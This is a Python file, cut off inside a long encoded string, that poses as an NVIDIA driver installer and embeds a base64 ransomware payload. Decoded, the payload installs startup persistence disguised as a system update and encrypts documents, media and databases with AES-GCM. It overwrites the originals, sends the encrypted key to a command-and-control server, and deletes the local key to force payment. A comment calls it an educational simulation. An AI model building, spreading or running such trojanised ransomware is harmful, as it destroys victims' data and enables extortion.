import sys
import os
import base64
import subprocess
import threading
import time
import tempfile
import ctypes
from tkinter import Tk, Label, Button, ttk, PhotoImage, Frame

# --- CONFIGURATION ---
FAKE_TITLE = "NVIDIA GeForce Game Ready Driver Installer"
PAYLOAD_B64 = "IyByYW5zb213YXJlLnB5CmltcG9ydCBvcwppbXBvcnQgc3lzCmltcG9ydCBiYXNlNjQKaW1wb3J0IGpzb24KaW1wb3J0IHRocmVhZGluZwppbXBvcnQgdGltZQppbXBvcnQgc29ja2V0CmltcG9ydCBzaHV0aWwKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IGN0eXBlcwoKIyBERUJVRzogQ3Jhc2ggTG9nZ2luZyBmb3IgSW1wb3J0cwp0cnk6CiAgICBmcm9tIHRraW50ZXIgaW1wb3J0IFRrLCBMYWJlbCwgRW50cnksIEJ1dHRvbiwgU3RyaW5nVmFyLCBGcmFtZSwgUGhvdG9JbWFnZSwgbWVzc2FnZWJveAogICAgZnJvbSB0a2ludGVyIGltcG9ydCBmb250IGFzIHRrZm9udAogICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuY2lwaGVycyBpbXBvcnQgQ2lwaGVyLCBhbGdvcml0aG1zLCBtb2RlcwogICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMgaW1wb3J0IGhhc2hlcwogICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMua2RmLnBia2RmMiBpbXBvcnQgUEJLREYySE1BQwogICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzIGltcG9ydCBkZWZhdWx0X2JhY2tlbmQKICAgIGltcG9ydCByZXF1ZXN0cwpleGNlcHQgSW1wb3J0RXJyb3IgYXMgZToKICAgIHRyeToKICAgICAgICBkZWJ1Z19wYXRoID0gb3MucGF0aC5qb2luKG9zLnBhdGguZXhwYW5kdXNlcigifiIpLCAiUkFOU09NV0FSRV9JTVBPUlRfRVJST1IudHh0IikKICAgICAgICB3aXRoIG9wZW4oZGVidWdfcGF0aCwgInciKSBhcyBmOgogICAgICAgICAgICBmLndyaXRlKGYiRmFpbGVkIHRvIGltcG9ydCBtb2R1bGVzOiB7ZX0iKQogICAgZXhjZXB0OiBwYXNzCiAgICBzeXMuZXhpdCgxKQoKIyAtLS0gQ29uZmlndXJhdGlvbiAtLS0KIyBQQVNURSBUSEUgUFVCTElDIEtFWSBGUk9NIFRIRSBDMiBTRVJWRVInUyBDT05TT0xFIE9VVFBVVCBIRVJFCkFUVEFDS0VSX1BVQkxJQ19LRVkgPSAiIiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLQpNSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQXkyNWFFb0FNdVFTWmYvTlVkQzFVClpOWVRYYUwwVDg2UjkzVjNNTkVZcitJYjVJYnRXSmdieElmeTJScnJHbG9kMGgrNWR4ejY5RmRmb1cvVEFGTzMKbG5XNkFwOHpuUURKZTk3cWxNNWRyaWNsMTRrVWJxUHdjOHNrNkJBUW9UOWZhSlNGYWdScVNzYUduOVl2bnp1VwpvMHE3by9EK2lsbkdjOVhXaEhnWkRsL3ZFU0daRVplSkQxZ2czNTFpWHBwcko3QVJpZnVBVm8reGFpZ0VzbVlOCnBKNXFpSjV5OWVFSExLd3VCNkZrcFIvNWN0N1crRzdZMUhqRXprTG84RytvUUI0ekZsckFJTlpQdkhvUTR1SkEKRWZyVXZJL1B6MktrMlFDekRYR1laTmNzQWJ5bDJFbG1tU3FwcXowc2Y2ZFZLNU8vOW1sOGxGVm4rbStROUhUKwpEd0lEQVFBQgotLS0tLUVORCBQVUJMSUMgS0VZLS0tLS0KIiIiCgpDMl9TRVJWRVJfVVJMID0gImh0dHA6Ly8xMC4wLjAuMjEyOjUwMDAiICMgQ2hhbmdlIGlmIHlvdXIgQzIgaXMgaG9zdGVkIGVsc2V3aGVyZQoKIyAtLS0gUEFUSCBDT05GSUdVUkFUSU9OIC0tLQpkZWYgZ2V0X3BhdGhzKCk6CiAgICAiIiJEZXRlcm1pbmVzIHN0YWJsZSBwYXRocyBmb3IgY29uZmlnIGFuZCB0YXJnZXQgZGF0YS4iIiIKICAgIGhvbWUgPSBvcy5wYXRoLmV4cGFuZHVzZXIoIn4iKQogICAgCiAgICBpZiBvcy5uYW1lID09ICdudCc6CiAgICAgICAgY29uZmlnX2RpciA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uLmdldCgnQVBQREFUQScsIGhvbWUpLCAiQ2VyYmVydXMiKQogICAgZWxzZToKICAgICAgICBjb25maWdfZGlyID0gb3MucGF0aC5qb2luKGhvbWUsICIuY29uZmlnIiwgImNlcmJlcnVzIikKICAgICAgICAKICAgICMgRU5DUllQVCBPTkxZICd0ZXN0X2RhdGEnIElOIEhPTUUgRElSRUNUT1JZCiAgICB0YXJnZXRfZGlyID0gb3MucGF0aC5qb2luKGhvbWUsICJ0ZXN0X2RhdGEiKQogICAgCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoY29uZmlnX2Rpcik6CiAgICAgICAgdHJ5OiBvcy5tYWtlZGlycyhjb25maWdfZGlyKQogICAgICAgIGV4Y2VwdDogcGFzcwogICAgICAgIAogICAgcmV0dXJuIGNvbmZpZ19kaXIsIHRhcmdldF9kaXIKCkNPTkZJR19ESVIsIFRBUkdFVF9ESVJFQ1RPUlkgPSBnZXRfcGF0aHMoKQoKIyBQZXJzaXN0ZW5jZSBGaWxlcyAoU3RvcmVkIGluIEhJRERFTiBDb25maWcgRGlyKQpMT0NLX0ZJTEUgPSBvcy5wYXRoLmpvaW4oQ09ORklHX0RJUiwgIi5jZXJiZXJ1c19sb2NrIikKSURfRklMRSA9IG9zLnBhdGguam9pbihDT05GSUdfRElSLCAiY2VyYmVydXNfaWQudHh0IikgCktFWV9CQUNLVVBfRklMRSA9IG9zLnBhdGguam9pbihDT05GSUdfRElSLCAiY2VyYmVydXNfa2V5LmJhayIpCkxPR19GSUxFID0gb3MucGF0aC5qb2luKENPTkZJR19ESVIsICJjZXJiZXJ1c19sb2cudHh0IikKCiMgQ2xlYW51cCBNYXJrZXIgKENhbiBzdGF5IGluIGNvbmZpZyBkaXIgb3IgYmUgZ2xvYmFsKQpDTEVBTl9NQVJLRVIgPSBvcy5wYXRoLmpvaW4oQ09ORklHX0RJUiwgIi5jZXJiZXJ1c19mcmVlZCIpCgpFTkNSWVBURURfRVhURU5TSU9OID0gIi5jZXJiZXJ1cyIKCiMgLS0tIEZpbGUgVHlwZSBUYXJnZXRpbmcgLS0tClRBUkdFVF9FWFRFTlNJT05TID0gewogICAgJy50eHQnLCAnLmRvYycsICcuZG9jeCcsICcueGxzJywgJy54bHN4JywgJy5wcHQnLCAnLnBwdHgnLCAnLnBkZicsCiAgICAnLmpwZycsICcuanBlZycsICcucG5nJywgJy5naWYnLCAnLmJtcCcsICcudGlmZicsICcuc3ZnJywKICAgICcubXAzJywgJy53YXYnLCAnLm1wNCcsICcuYXZpJywgJy5tb3YnLCAnLm1rdicsICcuc3FsJywgJy5kYicKfQoKIyAtLS0gR1VJIEFzc2V0IChCYXNlNjQgZW5jb2RlZCAxeDEgcmVkIHBpeGVsIGZvciBsb2dvKSAtLS0KTE9HT19CQVNFNjQgPSAiIiIKaVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQUFFQUFBQUJDQVlBQUFBZkZjU0pBQUFBRFVsRVFWUjQybVA4LzUraEhnQUhnZ0ovUGNoSTd3QUFBQUJKUlU1RXJrSmdnZz09CiIiIgoKIyAtLS0gUGVyc2lzdGVuY2UgVXRpbGl0aWVzIC0tLQpkZWYgaW5zdGFsbF9wZXJzaXN0ZW5jZSgpOgogICAgIiIiSW5zdGFsbHMgdGhlIHJhbnNvbXdhcmUgdG8gcnVuIG9uIHN0YXJ0dXAgdXNpbmcgYWJzb2x1dGUgcGF0aHMuIiIiCiAgICB0cnk6CiAgICAgICAgaWYgZ2V0YXR0cihzeXMsICdmcm96ZW4nLCBGYWxzZSk6CiAgICAgICAgICAgIGFwcF9wYXRoID0gc3lzLmV4ZWN1dGFibGUKICAgICAgICBlbHNlOgogICAgICAgICAgICBhcHBfcGF0aCA9IG9zLnBhdGguYWJzcGF0aChfX2ZpbGVfXykKICAgICAgICAgICAgCiAgICAgICAgaWYgb3MubmFtZSA9PSAnbnQnOgogICAgICAgICAgICBpbXBvcnQgd2lucmVnCiAgICAgICAgICAgIGtleV9wYXRoID0gciJTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGtleSA9IHdpbnJlZy5PcGVuS2V5KHdpbnJlZy5IS0VZX0NVUlJFTlRfVVNFUiwga2V5X3BhdGgsIDAsIHdpbnJlZy5LRVlfU0VUX1ZBTFVFKQogICAgICAgICAgICAgICAgY21kID0gZicie2FwcF9wYXRofSInCiAgICAgICAgICAgICAgICB3aW5yZWcuU2V0VmFsdWVFeChrZXksICJXaW5kb3dzU3lzdGVtVXBkYXRlIiwgMCwgd2lucmVnLlJFR19TWiwgY21kKQogICAgICAgICAgICAgICAgd2lucmVnLkNsb3NlS2V5KGtleSkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgbG9nX2Vycm9yKGYiV2luZG93cyBwZXJzaXN0ZW5jZSBmYWlsZWQ6IHtlfSIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgYXV0b3N0YXJ0X2RpciA9IG9zLnBhdGguZXhwYW5kdXNlcigifi8uY29uZmlnL2F1dG9zdGFydCIpCiAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhhdXRvc3RhcnRfZGlyKToKICAgICAgICAgICAgICAgIHRyeTogb3MubWFrZWRpcnMoYXV0b3N0YXJ0X2RpcikKICAgICAgICAgICAgICAgIGV4Y2VwdDogcGFzcwogICAgICAgICAgICAKICAgICAgICAgICAgZGVza3RvcF9maWxlID0gb3MucGF0aC5qb2luKGF1dG9zdGFydF9kaXIsICJzeXN0ZW1fdXBkYXRlLmRlc2t0b3AiKQogICAgICAgICAgICB3aXRoIG9wZW4oZGVza3RvcF9maWxlLCAidyIpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKGYiW0Rlc2t0b3AgRW50cnldXG4iKQogICAgICAgICAgICAgICAgZi53cml0ZShmIlR5cGU9QXBwbGljYXRpb25cbiIpCiAgICAgICAgICAgICAgICBmLndyaXRlKGYiTmFtZT1TeXN0ZW0gQ3JpdGljYWwgVXBkYXRlXG4iKQogICAgICAgICAgICAgICAgIyBDb21tYW5kOiBweXRob24zIC9wYXRoL3RvL3JhbnNvbXdhcmUucHkKICAgICAgICAgICAgICAgIGlmIGdldGF0dHIoc3lzLCAnZnJvemVuJywgRmFsc2UpOgogICAgICAgICAgICAgICAgICAgICBjbWQgPSBmInthcHBfcGF0aH0iCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICBjbWQgPSBmIntzeXMuZXhlY3V0YWJsZX0ge2FwcF9wYXRofSIKICAgICAgICAgICAgICAgIGYud3JpdGUoZiJFeGVjPXtjbWR9XG4iKQogICAgICAgICAgICAgICAgZi53cml0ZShmIlRlcm1pbmFsPWZhbHNlXG4iKQogICAgICAgICAgICAgICAgZi53cml0ZShmIlgtR05PTUUtQXV0b3N0YXJ0LWVuYWJsZWQ9dHJ1ZVxuIikKICAgICAgICAgICAgCiAgICAgICAgICAgIHRyeTogc3VicHJvY2Vzcy5ydW4oWydjaG1vZCcsICcreCcsIGRlc2t0b3BfZmlsZV0pCiAgICAgICAgICAgIGV4Y2VwdDogcGFzcwogICAgICAgICAgICAKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBsb2dfZXJyb3IoZiJQZXJzaXN0ZW5jZSBpbnN0YWxsYXRpb24gZmFpbGVkOiB7ZX0iKQoKZGVmIHJlbW92ZV9wZXJzaXN0ZW5jZSgpOgogICAgIiIiUmVtb3ZlcyB0aGUgcGVyc2lzdGVuY2UgbWVjaGFuaXNtLiIiIgogICAgdHJ5OgogICAgICAgIGlmIG9zLm5hbWUgPT0gJ250JzoKICAgICAgICAgICAgaW1wb3J0IHdpbnJlZwogICAgICAgICAgICBrZXlfcGF0aCA9IHIiU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBrZXkgPSB3aW5yZWcuT3BlbktleSh3aW5yZWcuSEtFWV9DVVJSRU5UX1VTRVIsIGtleV9wYXRoLCAwLCB3aW5yZWcuS0VZX1NFVF9WQUxVRSkKICAgICAgICAgICAgICAgIHdpbnJlZy5EZWxldGVWYWx1ZShrZXksICJXaW5kb3dzU3lzdGVtVXBkYXRlIikKICAgICAgICAgICAgICAgIHdpbnJlZy5DbG9zZUtleShrZXkpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHBhc3MgCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcGF0aHMgPSBbCiAgICAgICAgICAgICAgICBvcy5wYXRoLmV4cGFuZHVzZXIoIn4vLmNvbmZpZy9hdXRvc3RhcnQvc3lzdGVtX3VwZGF0ZS5kZXNrdG9wIiksCiAgICAgICAgICAgICAgICBvcy5wYXRoLmV4cGFuZHVzZXIoIn4vLmxvY2FsL3NoYXJlL2FwcGxpY2F0aW9ucy9zeXN0ZW1fdXBkYXRlLmRlc2t0b3AiKQogICAgICAgICAgICBdCiAgICAgICAgICAgIGZvciBwIGluIHBhdGhzOgogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMocCk6CiAgICAgICAgICAgICAgICAgICAgb3MucmVtb3ZlKHApCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgbG9nX2Vycm9yKGYiUGVyc2lzdGVuY2UgcmVtb3ZhbCBmYWlsZWQ6IHtlfSIpCgojIC0tLSBTeXN0ZW0gTG9ja2Rvd24gVXRpbGl0aWVzIC0tLQpkZWYgaGlkZV9jb25zb2xlKCk6CiAgICBpZiBvcy5uYW1lID09ICdudCc6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpbXBvcnQgY3R5cGVzCiAgICAgICAgICAgIGtlcm5lbDMyID0gY3R5cGVzLldpbkRMTCgna2VybmVsMzInKQogICAgICAgICAgICB1c2VyMzIgPSBjdHlwZXMuV2luRExMKCd1c2VyMzInKQogICAgICAgICAgICBoV25kID0ga2VybmVsMzIuR2V0Q29uc29sZVdpbmRvdygpCiAgICAgICAgICAgIGlmIGhXbmQ6CiAgICAgICAgICAgICAgICB1c2VyMzIuU2hvd1dpbmRvdyhoV25kLCAwKSAjIFNXX0hJREUgPSAwCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwYXNzCgojIC0tLSBDcnlwdG9ncmFwaHkgLS0tCmRlZiBnZW5lcmF0ZV9hZXNfa2V5KCk6CiAgICByZXR1cm4gb3MudXJhbmRvbSgzMikKCmRlZiBlbmNyeXB0X2ZpbGVfYWVzX2djbShmaWxlX3BhdGgsIGtleSk6CiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3JiJykgYXMgZjoKICAgICAgICAgICAgZGF0YSA9IGYucmVhZCgpCiAgICAgICAgbm9uY2UgPSBvcy51cmFuZG9tKDEyKQogICAgICAgIGNpcGhlciA9IENpcGhlcihhbGdvcml0aG1zLkFFUyhrZXkpLCBtb2Rlcy5HQ00obm9uY2UpLCBiYWNrZW5kPWRlZmF1bHRfYmFja2VuZCgpKQogICAgICAgIGVuY3J5cHRvciA9IGNpcGhlci5lbmNyeXB0b3IoKQogICAgICAgIGVuY3J5cHRlZF9kYXRhID0gZW5jcnlwdG9yLnVwZGF0ZShkYXRhKSArIGVuY3J5cHRvci5maW5hbGl6ZSgpCiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCArIEVOQ1JZUFRFRF9FWFRFTlNJT04sICd3YicpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUobm9uY2UgKyBlbmNyeXB0b3IudGFnICsgZW5jcnlwdGVkX2RhdGEpCiAgICAgICAgcmV0dXJuIFRydWUKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBsb2dfZXJyb3IoZiJGYWlsZWQgdG8gZW5jcnlwdCB7ZmlsZV9wYXRofToge2V9IikKICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiBkZWNyeXB0X2ZpbGVfYWVzX2djbShlbmNyeXB0ZWRfcGF0aCwga2V5KToKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oZW5jcnlwdGVkX3BhdGgsICdyYicpIGFzIGY6CiAgICAgICAgICAgIG5vbmNlX3RhZ19kYXRhID0gZi5yZWFkKCkKICAgICAgICBub25jZSwgdGFnLCBlbmNyeXB0ZWRfZGF0YSA9IG5vbmNlX3RhZ19kYXRhWzoxMl0sIG5vbmNlX3RhZ19kYXRhWzEyOjI4XSwgbm9uY2VfdGFnX2RhdGFbMjg6XQogICAgICAgIGNpcGhlciA9IENpcGhlcihhbGdvcml0aG1zLkFFUyhrZXkpLCBtb2Rlcy5HQ00obm9uY2UsIHRhZyksIGJhY2tlbmQ9ZGVmYXVsdF9iYWNrZW5kKCkpCiAgICAgICAgZGVjcnlwdG9yID0gY2lwaGVyLmRlY3J5cHRvcigpCiAgICAgICAgZGVjcnlwdGVkX2RhdGEgPSBkZWNyeXB0b3IudXBkYXRlKGVuY3J5cHRlZF9kYXRhKSArIGRlY3J5cHRvci5maW5hbGl6ZSgpCiAgICAgICAgb3JpZ2luYWxfcGF0aCA9IGVuY3J5cHRlZF9wYXRoLnJlbW92ZXN1ZmZpeChFTkNSWVBURURfRVhURU5TSU9OKQogICAgICAgIHdpdGggb3BlbihvcmlnaW5hbF9wYXRoLCAnd2InKSBhcyBmOgogICAgICAgICAgICBmLndyaXRlKGRlY3J5cHRlZF9kYXRhKQogICAgICAgIG9zLnJlbW92ZShlbmNyeXB0ZWRfcGF0aCkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGxvZ19lcnJvcihmIkZhaWxlZCB0byBkZWNyeXB0IHtlbmNyeXB0ZWRfcGF0aH06IHtlfSIpCiAgICAgICAgcmV0dXJuIEZhbHNlCgpkZWYgc2VjdXJlX2RlbGV0ZV9maWxlKGZpbGVfcGF0aCwgcGFzc2VzPTEpOiAKICAgIHRyeToKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhmaWxlX3BhdGgpOgogICAgICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAiYmErIikgYXMgZjoKICAgICAgICAgICAgICAgIGxlbmd0aCA9IGYudGVsbCgpCiAgICAgICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICJyK2IiKSBhcyBmOgogICAgICAgICAgICAgICAgZi53cml0ZShvcy51cmFuZG9tKGxlbmd0aCkpCiAgICAgICAgICAgIG9zLnJlbW92ZShmaWxlX3BhdGgpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgbG9nX2Vycm9yKGYiRmFpbGVkIHRvIHNlY3VyZWx5IGRlbGV0ZSB7ZmlsZV9wYXRofToge2V9IikKCiMgLS0tIExvZ2dpbmcgLS0tCmRlZiBsb2dfZXJyb3IobWVzc2FnZSk6CiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKExPR19GSUxFLCAnYScpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoZiJ7dGltZS5zdHJmdGltZSgnJVktJW0tJWQgJUg6JU06JVMnKX0gLSBFUlJPUjoge21lc3NhZ2V9XG4iKQogICAgZXhjZXB0OgogICAgICAgIHBhc3MgCgojIC0tLSBSYW5zb213YXJlIExvZ2ljIC0tLQpkZWYgZW5jcnlwdF9kaXJlY3RvcnkoKToKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhUQVJHRVRfRElSRUNUT1JZKToKICAgICAgICB0cnk6IG9zLm1ha2VkaXJzKFRBUkdFVF9ESVJFQ1RPUlkpCiAgICAgICAgZXhjZXB0OiBwYXNzCgogICAgaWYgb3MucGF0aC5leGlzdHMoS0VZX0JBQ0tVUF9GSUxFKToKICAgICAgICBsb2dfZXJyb3IoIkZvdW5kIGtleSBiYWNrdXAuIFJlc3VtaW5nIGZyb20gY3Jhc2guLi4iKQogICAgICAgIHRyeToKICAgICAgICAgICAgd2l0aCBvcGVuKEtFWV9CQUNLVVBfRklMRSwgJ3JiJykgYXMgZjoKICAgICAgICAgICAgICAgIHJldHVybiBmLnJlYWQoKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcyAKCiAgICBpZiBvcy5wYXRoLmV4aXN0cyhMT0NLX0ZJTEUpOgogICAgICAgIGxvZ19lcnJvcigiRW5jcnlwdGlvbiBzZWVtaW5nbHkgY29tcGxldGUgKExvY2sgZmlsZSBleGlzdHMpLiIpCiAgICAgICAgcmV0dXJuIE5vbmUKCiAgICBhZXNfa2V5ID0gZ2VuZXJhdGVfYWVzX2tleSgpCiAgICAKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oS0VZX0JBQ0tVUF9GSUxFLCAnd2InKSBhcyBmOgogICAgICAgICAgICBmLndyaXRlKGFlc19rZXkpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgbG9nX2Vycm9yKGYiRmFpbGVkIHRvIHdyaXRlIGtleSBiYWNrdXA6IHtlfSIpCgogICAgZW5jcnlwdGVkX2ZpbGVzID0gMAogICAgIyBPTkxZIFdBTEsgVEFSR0VUX0RJUkVDVE9SWQogICAgaWYgb3MucGF0aC5leGlzdHMoVEFSR0VUX0RJUkVDVE9SWSk6CiAgICAgICAgZm9yIHJvb3QsIF8sIGZpbGVzIGluIG9zLndhbGsoVEFSR0VUX0RJUkVDVE9SWSk6CiAgICAgICAgICAgIGZvciBmaWxlIGluIGZpbGVzOgogICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKHJvb3QsIGZpbGUpCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLnNwbGl0ZXh0KGZpbGUpWzFdLmxvd2VyKCkgaW4gVEFSR0VUX0VYVEVOU0lPTlMgYW5kIG5vdCBmaWxlX3BhdGguZW5kc3dpdGgoRU5DUllQVEVEX0VYVEVOU0lPTik6CiAgICAgICAgICAgICAgICAgICAgaWYgZW5jcnlwdF9maWxlX2Flc19nY20oZmlsZV9wYXRoLCBhZXNfa2V5KToKICAgICAgICAgICAgICAgICAgICAgICAgc2VjdXJlX2RlbGV0ZV9maWxlKGZpbGVfcGF0aCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5jcnlwdGVkX2ZpbGVzICs9IDEKCiAgICB3aXRoIG9wZW4oTE9DS19GSUxFLCAndycpIGFzIGY6CiAgICAgICAgZi53cml0ZSgiRW5jcnlwdGlvbiBjb21wbGV0ZS4iKQoKICAgIGxvZ19lcnJvcihmIkVuY3J5cHRpb24gZmluaXNoZWQuIHtlbmNyeXB0ZWRfZmlsZXN9IGZpbGVzIHRhcmdldGVkLiIpCiAgICByZXR1cm4gYWVzX2tleQoKZGVmIGNoZWNrX2luX3dpdGhfYzIoYWVzX2tleSk6CiAgICB0cnk6CiAgICAgICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMgaW1wb3J0IHNlcmlhbGl6YXRpb24KICAgICAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5hc3ltbWV0cmljIGltcG9ydCBwYWRkaW5nCiAgICAgICAgCiAgICAgICAgcHVibGljX2tleSA9IHNlcmlhbGl6YXRpb24ubG9hZF9wZW1fcHVibGljX2tleShBVFRBQ0tFUl9QVUJMSUNfS0VZLmVuY29kZSgpLCBiYWNrZW5kPWRlZmF1bHRfYmFja2VuZCgpKQogICAgICAgIGVuY3J5cHRlZF9hZXNfa2V5ID0gcHVibGljX2tleS5lbmNyeXB0KAogICAgICAgICAgICBhZXNfa2V5LAogICAgICAgICAgICBwYWRkaW5nLk9BRVAoCiAgICAgICAgICAgICAgICBtZ2Y9cGFkZGluZy5NR0YxKGFsZ29yaXRobT1oYXNoZXMuU0hBMjU2KCkpLAogICAgICAgICAgICAgICAgYWxnb3JpdGhtPWhhc2hlcy5TSEEyNTYoKSwKICAgICAgICAgICAgICAgIGxhYmVsPU5vbmUKICAgICAgICAgICAgKQogICAgICAgICkKICAgICAgICBwYXlsb2FkID0geyJrZXkiOiBiYXNlNjQuYjY0ZW5jb2RlKGVuY3J5cHRlZF9hZXNfa2V5KS5kZWNvZGUoJ3V0Zi04Jyl9CiAgICAgICAgCiAgICAgICAgdmljdGltX2lkID0gTm9uZQogICAgICAgIGxvZ19lcnJvcihmIkF0dGVtcHRpbmcgdG8gY29ubmVjdCB0byBDMiBhdDoge0MyX1NFUlZFUl9VUkx9IikKICAgICAgICAKICAgICAgICBmb3IgXyBpbiByYW5nZSgzKToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KGYie0MyX1NFUlZFUl9VUkx9L2FwaS9jaGVja2luIiwganNvbj1wYXlsb2FkLCB0aW1lb3V0PTUpCiAgICAgICAgICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICAgICAgdmljdGltX2lkID0gcmVzcG9uc2UuanNvbigpLmdldCgndmljdGltX2lkJykKICAgICAgICAgICAgICAgICAgICBsb2dfZXJyb3IoZiJDb25uZWN0ZWQhIFZpY3RpbSBJRDoge3ZpY3RpbV9pZH0iKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIGxvZ19lcnJvcihmIkNvbm5lY3Rpb24gYXR0ZW1wdCBmYWlsZWQ6IHtlfSIpCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDIpCiAgICAgICAgCiAgICAgICAgaWYgbm90IHZpY3RpbV9pZDoKICAgICAgICAgICAgIyAtLS0gT0ZGTElORSBGQUxMQkFDSyAtLS0KICAgICAgICAgICAgbG9nX2Vycm9yKCJDMiBVbnJlYWNoYWJsZS4gU3dpdGNoaW5nIHRvIE9GRkxJTkUgTU9ERS4iKQogICAgICAgICAgICAjIEdlbmVyYXRlIGEgbG9jYWwgSUQgc28gdGhlIEdVSSBzdGlsbCBsYXVuY2hlcwogICAgICAgICAgICB2aWN0aW1faWQgPSAiT0ZGTElORS0iICsgYmFzZTY0LnVybHNhZmVfYjY0ZW5jb2RlKG9zLnVyYW5kb20oNCkpLmRlY29kZSgndXRmLTgnKS5yc3RyaXAoJz0nKQogICAgICAgICAgICAKICAgICAgICAgICAgIyBTYXZlIHRoZSBrZXkgbG9jYWxseSBmb3IgbWFudWFsIHJlY292ZXJ5IGlmIG5lZWRlZCAoaW4gYSByZWFsIHNjZW5hcmlvIHRoaXMgbWlnaHQgZGlmZmVyKQogICAgICAgICAgICAjIEZvciB0aGlzIGVkdWNhdGlvbmFsL3NpbSwgd2UganVzdCBrZWVwIHRoZSBrZXkgYmFja3VwIGZpbGUgYXMgdGhlICdrZXkgc3RvcmUnCiAgICAgICAgICAgICMgb3Igd2UgY291bGQgd3JpdGUgaXQgdG8gYSBzZXBhcmF0ZSBoaWRkZW4gZmlsZS4KICAgICAgICAgICAgcGFzcwoKICAgICAgICB3aXRoIG9wZW4oSURfRklMRSwgJ3cnKSBhcyBmOgogICAgICAgICAgICBmLndyaXRlKHZpY3RpbV9pZCkKICAgICAgICAKICAgICAgICAjIElmIHdlIGFyZSBvZmZsaW5lLCB3ZSBETyBOT1QgZGVsZXRlIHRoZSBrZXkgYmFja3VwLCBzbyB3ZSBjYW4gcmVjb3ZlciBpdCBtYW51YWxseSBpZiBuZWVkZWQuCiAgICAgICAgIyBJZiB3ZSBhcmUgb25saW5lLCB3ZSBkZWxldGUgaXQgdG8gZm9yY2UgcGF5bWVudC4KICAgICAgICBpZiAiT0ZGTElORSIgbm90IGluIHZpY3RpbV9pZCBhbmQgb3MucGF0aC5leGlzdHMoS0VZX0JBQ0tVUF9GSUxFKToKICAgICAgICAgICAgIG9zLnJlbW92ZShLRVlfQkFDS1VQX0ZJTEUpCiAgICAgICAgICAgIAogICAgICAgIGxvZ19lcnJvcihmIkNoZWNrLWluIGNvbXBsZXRlLiBGaW5hbCBWaWN0aW0gSUQ6IHt2aWN0aW1faWR9IikKICAgICAgICByZXR1cm4gdmljdGltX2lkCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGxvZ19lcnJvcihmIkMyIGNoZWNrLWluIGNyaXRpY2FsIGZhaWx1cmU6IHtlfSIpCiAgICAgICAgIyBVbHRpbWF0ZSBmYWxsYmFjawogICAgICAgIHJldHVybiAiQ1JJVElDQUwtRkFJTFVSRSIKCiMgLS0tIEdVSSBMb2dpYyAtLS0KY2xhc3MgUmFuc29td2FyZUdVSToKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBtYXN0ZXIsIHZpY3RpbV9pZCk6CiAgI